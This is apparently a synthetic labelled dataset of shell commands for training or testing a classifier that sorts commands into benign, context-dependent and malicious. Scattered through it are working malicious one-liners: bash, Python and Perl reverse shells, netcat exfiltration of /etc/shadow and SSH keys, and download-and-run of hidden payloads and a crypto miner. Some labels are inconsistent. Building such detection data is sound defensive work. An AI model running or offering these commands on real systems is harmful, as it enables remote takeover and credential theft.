command,label,original_label,mitre_id
tmux new -d -s session '/tmp/agent.sh',Context_Dependent,Synthetic,Synthetic
nc -zv 192.168.1.50 22,Context_Dependent,Synthetic,Synthetic
vim /srv/www/settings.json,Benign,Synthetic,Synthetic
mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 10.0.0.1 4444 1>/tmp/backpipe,Malicious,Synthetic,Synthetic
cat ~/.bash_profile,Benign,Synthetic,Synthetic
npx eslint src/,Benign,Synthetic,Synthetic
ls /home/user/,Benign,Synthetic,Synthetic
groupmod -n newname oldname,Benign,Synthetic,Synthetic
grep -c 'timeout' /var/log/syslog,Benign,Synthetic,Synthetic
grep -ri password /var/www/,Context_Dependent,Synthetic,Synthetic
cat /etc/passwd | nc 10.0.0.5 8080,Malicious,Synthetic,Synthetic
mv /var/lib/docker-compose.yml.old /var/lib/docker-compose.yml,Benign,Synthetic,Synthetic
"socat TCP-LISTEN:1337,fork -",Context_Dependent,Synthetic,Synthetic
su - root -c 'apt update',Benign,Synthetic,Synthetic
nano /etc/nginx/deploy.sh,Benign,Synthetic,Synthetic
nmap -sn 172.16.0.0/24,Context_Dependent,Synthetic,Synthetic
pidof mysql,Benign,Synthetic,Synthetic
fdisk -l,Benign,Synthetic,Synthetic
cp /home/user/projects/server.js /home/user/projects/server.js.bak,Benign,Synthetic,Synthetic
journalctl -u postgresql --no-pager -n 20,Benign,Synthetic,Synthetic
pidof postgres,Benign,Synthetic,Synthetic
ps aux | grep java,Benign,Synthetic,Synthetic
vim /srv/www/Makefile,Benign,Synthetic,Synthetic
arp -a && ip neigh && cat /proc/net/arp,Malicious,Synthetic,Synthetic
date -u,Benign,Synthetic,Synthetic
ls -la /opt/services,Benign,Synthetic,Synthetic
mount /dev/sda1 /mnt && chroot /mnt /bin/bash,Malicious,Synthetic,Synthetic
nmap localhost,Benign,Synthetic,Synthetic
systemctl is-active sshd,Benign,Synthetic,Synthetic
find /var/log -name '*.log' -exec grep -l 'password' {} \;,Context_Dependent,Synthetic,Synthetic
vim /home/user/monitor.py,Benign,Synthetic,Synthetic
tail -20 /etc/nginx/nginx.conf,Benign,Synthetic,Synthetic
ip route show,Benign,Synthetic,Synthetic
du -ah /home/user | sort -rh | head -10,Benign,Synthetic,Synthetic
chmod 644 index.html,Benign,Synthetic,Synthetic
ssh admin@db-01,Benign,Synthetic,Synthetic
"column -t -s, data.csv | head",Benign,Synthetic,Synthetic
ls -la /etc/apache2/sites-enabled/,Benign,Synthetic,Synthetic
gunicorn app:app --bind 0.0.0.0:8000,Benign,Synthetic,Synthetic
nmap -sn 192.168.1.0/24,Context_Dependent,Synthetic,Synthetic
cat /etc/hosts,Benign,Synthetic,Synthetic
git remote show origin,Benign,Synthetic,Synthetic
systemctl restart nomad,Benign,Synthetic,Synthetic
systemctl is-active rsyslog,Benign,Synthetic,Synthetic
nc 10.0.0.1 80,Context_Dependent,Synthetic,Synthetic
base64 certificate.pem,Benign,Synthetic,Synthetic
lshw -short,Benign,Synthetic,Synthetic
curl -s http://10.10.14.3/shell.sh -o /run/shm/.shell.sh && bash /run/shm/.shell.sh,Malicious,Synthetic,Synthetic
tar czf - /home/ | nc 10.0.0.1 8888,Malicious,Synthetic,Synthetic
od -A x -t x1z -v /dev/urandom | head -5,Benign,Synthetic,Synthetic
docker inspect web,Benign,Synthetic,Synthetic
dig api.company.com,Benign,Synthetic,Synthetic
ssh ubuntu@staging,Benign,Synthetic,Synthetic
ssh ubuntu@db-01 'uptime',Benign,Synthetic,Synthetic
docker-compose up -d,Benign,Synthetic,Synthetic
journalctl -u docker --no-pager -n 20,Benign,Synthetic,Synthetic
sftp user@server,Benign,Synthetic,Synthetic
grep -r 'password' /srv/,Context_Dependent,Synthetic,Synthetic
npm update,Benign,Synthetic,Synthetic
grep -ri 'api_key' /srv/,Context_Dependent,Synthetic,Synthetic
nice -n 10 ./build.sh,Benign,Synthetic,Synthetic
curl -s http://172.16.5.10/agent -o /dev/shm/.proc/.agent && bash /dev/shm/.proc/.agent,Malicious,Synthetic,Synthetic
chgrp -R www-data /var/www,Benign,Synthetic,Synthetic
"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.100.200.1"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",Malicious,Synthetic,Synthetic
killall -9 sshd,Context_Dependent,Synthetic,Synthetic
bash -i >& /dev/tcp/172.16.5.10/1337 0>&1,Malicious,Synthetic,Synthetic
cat /etc/redhat-release,Benign,Synthetic,Synthetic
curl -X POST -d @/etc/shadow http://attacker.com/collect,Malicious,Synthetic,Synthetic
"wfuzz -c -z file,wordlist.txt http://target.com/FUZZ",Context_Dependent,Synthetic,Synthetic
echo $HOSTNAME,Benign,Synthetic,Synthetic
ip -s link,Benign,Synthetic,Synthetic
docker run -d --name helper --restart=always xmrig/xmrig -o pool.minexmr.com:4444,Malicious,Synthetic,Synthetic
go mod tidy,Benign,Synthetic,Synthetic
wget http://attacker.com/xmrig -O /dev/shm/.x && nohup /dev/shm/.x &,Malicious,Synthetic,Synthetic
ping -c 3 google.com,Benign,Synthetic,Synthetic
nano /home/admin/healthcheck.sh,Benign,Synthetic,Synthetic
cat /etc/os-release,Benign,Synthetic,Synthetic
curl -F 'file=@/etc/shadow' http://10.0.0.1:8080/upload,Malicious,Synthetic,Synthetic
"perl -e 'use Socket;$i=""172.16.0.50"";$p=8443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"")'",Malicious,Synthetic,Synthetic
bzip2 largefile.log,Benign,Synthetic,Synthetic
docker logs --tail 200 proxy,Benign,Synthetic,Synthetic
gpg --list-keys,Benign,Synthetic,Synthetic
find / -writable -type d 2>/dev/null,Context_Dependent,Synthetic,Synthetic
ls -lah /var/lib,Benign,Synthetic,Synthetic
ls -lt /srv/www | head -10,Benign,Synthetic,Synthetic
wget http://172.16.0.1:8080/implant -O /tmp/.hidden/implant && chmod +x /tmp/.hidden/implant && /tmp/.hidden/implant,Malicious,Synthetic,Synthetic
pip install flask,Benign,Synthetic,Synthetic
ls -la /var/www/html,Benign,Synthetic,Synthetic
ncat -lvnp 1337,Context_Dependent,Synthetic,Synthetic
dd if=/dev/sda of=/backup/disk.img bs=4M status=progress,Benign,Synthetic,Synthetic
nc -lvnp 1234,Context_Dependent,Synthetic,Synthetic
kubectl scale deployment/web --replicas=3,Benign,Synthetic,Synthetic
cp /opt/services/server.js /opt/services/server.js.bak,Benign,Synthetic,Synthetic
systemctl status postgresql,Benign,Synthetic,Synthetic
pidof python,Benign,Synthetic,Synthetic
sha256sum firmware.bin,Benign,Synthetic,Synthetic
cat /etc/bash.bashrc,Benign,Synthetic,Synthetic
"nmap -p 22,80,443 192.168.1.50",Context_Dependent,Synthetic,Synthetic
pip install --upgrade lodash,Benign,Synthetic,Synthetic
grep -i 'timeout' /var/log/nginx/error.log,Benign,Synthetic,Synthetic
systemctl status vault,Benign,Synthetic,Synthetic
sysctl -a | head -20,Benign,Synthetic,Synthetic
cp /home/user/healthcheck.sh /home/user/healthcheck.sh.bak,Benign,Synthetic,Synthetic
chown root:root /var/www,Benign,Synthetic,Synthetic
pkexec /bin/bash,Malicious,Synthetic,Synthetic
cp /var/lib/main.go /var/lib/main.go.bak,Benign,Synthetic,Synthetic
docker exec -it web bash,Benign,Synthetic,Synthetic
systemctl is-active rabbitmq-server,Benign,Synthetic,Synthetic
ls /tmp/,Benign,Synthetic,Synthetic
systemctl status logstash,Benign,Synthetic,Synthetic
env | grep PATH,Benign,Synthetic,Synthetic
cat /home/user/.ssh/id_rsa | nc 10.0.0.5 31337,Malicious,Synthetic,Synthetic
kill -HUP $(pidof mysql),Benign,Synthetic,Synthetic
sudo cat /etc/shadow,Benign,Synthetic,Synthetic
yarn build,Benign,Synthetic,Synthetic
vim /tmp/Makefile,Benign,Synthetic,Synthetic
conda activate myenv,Benign,Synthetic,Synthetic
ssh admin@production,Benign,Synthetic,Synthetic
pip install celery,Benign,Synthetic,Synthetic
ssh -R 1080:localhost:1080 user@external,Context_Dependent,Synthetic,Synthetic
"perl -e 'use Socket;$i=""192.168.1.1"";$p=31337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"")'",Malicious,Synthetic,Synthetic
systemctl is-active logstash,Benign,Synthetic,Synthetic
cut -d: -f1 /etc/passwd,Benign,Synthetic,Synthetic
head -50 /etc/redis/redis.conf,Benign,Synthetic,Synthetic
hostname -f,Benign,Synthetic,Synthetic
wget http://10.0.0.5:9090/rev.py -O /var/tmp/rev.py && chmod +x /var/tmp/rev.py && /var/tmp/rev.py,Malicious,Synthetic,Synthetic
journalctl -u grafana-server --no-pager -n 20,Benign,Synthetic,Synthetic
du -ah /tmp | sort -rh | head -10,Benign,Synthetic,Synthetic
cat /etc/lsb-release,Benign,Synthetic,Synthetic
curl -s http://10.0.0.5/rev.py -o /var/tmp/.rev.py && bash /var/tmp/.rev.py,Malicious,Synthetic,Synthetic
systemctl restart logstash,Benign,Synthetic,Synthetic
docker inspect worker,Benign,Synthetic,Synthetic
apt autoremove -y,Benign,Synthetic,Synthetic
nmcli connection show,Benign,Synthetic,Synthetic
docker exec cache ls /app,Benign,Synthetic,Synthetic
mv /home/user/main.go.old /home/user/main.go,Benign,Synthetic,Synthetic
pip show fastapi,Benign,Synthetic,Synthetic
ls -lt /etc/nginx | head -10,Benign,Synthetic,Synthetic
docker logs -f api,Benign,Synthetic,Synthetic
docker logs --tail 200 cache,Benign,Synthetic,Synthetic
curl -sS https://api.github.com | head -5,Benign,Synthetic,Synthetic
pip install --upgrade pip,Benign,Synthetic,Synthetic
blkid,Benign,Synthetic,Synthetic
journalctl -u prometheus --no-pager -n 20,Benign,Synthetic,Synthetic
make clean && make,Benign,Synthetic,Synthetic
findmnt -t ext4,Benign,Synthetic,Synthetic
systemctl disable cups,Benign,Synthetic,Synthetic
cat /etc/apache2/apache2.conf,Benign,Synthetic,Synthetic
pip install django,Benign,Synthetic,Synthetic
ls -la /var/log,Benign,Synthetic,Synthetic
ls -lah /tmp,Benign,Synthetic,Synthetic
sudo -u www-data bash,Benign,Synthetic,Synthetic
javac Main.java,Benign,Synthetic,Synthetic
which java,Benign,Synthetic,Synthetic
cat /etc/mtab,Benign,Synthetic,Synthetic
kill -HUP $(pidof gunicorn),Benign,Synthetic,Synthetic
sudo ufw allow 22,Benign,Synthetic,Synthetic
python3 -m pytest --cov=src tests/,Benign,Synthetic,Synthetic
chown -R nginx:nginx /srv/www,Benign,Synthetic,Synthetic
nano /var/lib/docker-compose.yml,Benign,Synthetic,Synthetic
vim /etc/nginx/deploy.sh,Benign,Synthetic,Synthetic
ssh-add ~/.ssh/id_rsa,Benign,Synthetic,Synthetic
curl -I https://api.company.com,Benign,Synthetic,Synthetic
rustc main.rs,Benign,Synthetic,Synthetic
cp -a /etc/nginx /backup/nginx_$(date +%Y%m%d),Benign,Synthetic,Synthetic
cp /srv/www/settings.json /srv/www/settings.json.bak,Benign,Synthetic,Synthetic
nano /var/www/index.html,Benign,Synthetic,Synthetic
quota -u $USER,Benign,Synthetic,Synthetic
cp /opt/services/settings.json /opt/services/settings.json.bak,Benign,Synthetic,Synthetic
nc -lvnp 9001,Context_Dependent,Synthetic,Synthetic
docker exec -it app bash,Benign,Synthetic,Synthetic
cp /var/lib/package.json /var/lib/package.json.bak,Benign,Synthetic,Synthetic
chmod 600 server.js,Benign,Synthetic,Synthetic
mv /home/user/config.yaml.old /home/user/config.yaml,Benign,Synthetic,Synthetic
alias ll='ls -la',Benign,Synthetic,Synthetic
ssh deploy@db-01,Benign,Synthetic,Synthetic
pip show react,Benign,Synthetic,Synthetic
curl -s http://172.16.0.1/beacon.sh -o /dev/shm/.proc/.beacon.sh && bash /dev/shm/.proc/.beacon.sh,Malicious,Synthetic,Synthetic
getcap -r / 2>/dev/null,Malicious,Synthetic,Synthetic
nmap -sn 10.0.0.0/24,Context_Dependent,Synthetic,Synthetic
crontab -l -u www-data,Benign,Synthetic,Synthetic
mv /opt/services/app.py.old /opt/services/app.py,Benign,Synthetic,Synthetic
chmod 755 deploy.sh,Benign,Synthetic,Synthetic
tar -czf /backup/$(date +%Y%m%d).tar.gz /var/www,Benign,Synthetic,Synthetic
pip show express,Benign,Synthetic,Synthetic
base64 /etc/sudoers | curl -d @- http://192.168.56.1:4443/,Malicious,Synthetic,Synthetic
vim /tmp/main.go,Benign,Synthetic,Synthetic
nano /opt/services/deploy.sh,Benign,Synthetic,Synthetic
auditctl -w /etc/passwd -p wa,Context_Dependent,Synthetic,Synthetic
docker top web,Benign,Synthetic,Synthetic
yarn add react,Benign,Synthetic,Synthetic
docker logs --tail 200 app,Benign,Synthetic,Synthetic
ps aux --sort=-%mem | head -10,Benign,Synthetic,Synthetic
hostname,Benign,Synthetic,Synthetic
medusa -h 10.0.0.1 -u admin -P wordlist.txt -M ssh,Context_Dependent,Synthetic,Synthetic
arp-scan --localnet,Context_Dependent,Synthetic,Synthetic
du -sh /home/*,Benign,Synthetic,Synthetic
node server.js,Benign,Synthetic,Synthetic
"perl -e 'use Socket;$i=""10.0.0.1"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"")'",Malicious,Synthetic,Synthetic
nano /home/user/projects/README.md,Benign,Synthetic,Synthetic
systemctl status elasticsearch,Benign,Synthetic,Synthetic
wget http://10.100.200.1:80/rev.py -O /tmp/.hidden/rev.py && chmod +x /tmp/.hidden/rev.py && /tmp/.hidden/rev.py,Malicious,Synthetic,Synthetic
git merge develop,Benign,Synthetic,Synthetic
df -h /usr/local/bin,Benign,Synthetic,Synthetic
traceroute 8.8.8.8,Benign,Synthetic,Synthetic
docker logs -f cache,Benign,Synthetic,Synthetic
nano /opt/app/app.py,Benign,Synthetic,Synthetic
firewall-cmd --state,Benign,Synthetic,Synthetic
chmod 755 settings.json,Benign,Synthetic,Synthetic
cp /home/user/nginx.conf /home/user/nginx.conf.bak,Benign,Synthetic,Synthetic
npx tsc,Benign,Synthetic,Synthetic
netstat -tunlp,Benign,Synthetic,Synthetic
cp /tmp/backdoor /usr/local/bin/sshd-helper && chmod +x /usr/local/bin/sshd-helper,Malicious,Synthetic,Synthetic
du -sh /var/log,Benign,Synthetic,Synthetic
git blame README.md,Benign,Synthetic,Synthetic
go build ./...,Benign,Synthetic,Synthetic
objdump -d /usr/bin/ls | head -30,Benign,Synthetic,Synthetic
wget -q http://evil.com/backdoor -O /tmp/bd,Context_Dependent,Synthetic,Synthetic
